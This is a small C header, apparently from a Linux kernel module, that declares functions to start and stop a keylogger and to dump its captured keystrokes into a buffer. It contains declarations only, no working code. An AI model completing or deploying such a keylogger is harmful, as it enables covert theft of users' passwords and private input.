#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/types.h>

void start_keylogger(void);
void stop_keylogger(void);
void get_keylogger_dump(char *dest, size_t *dump_len);

#endif
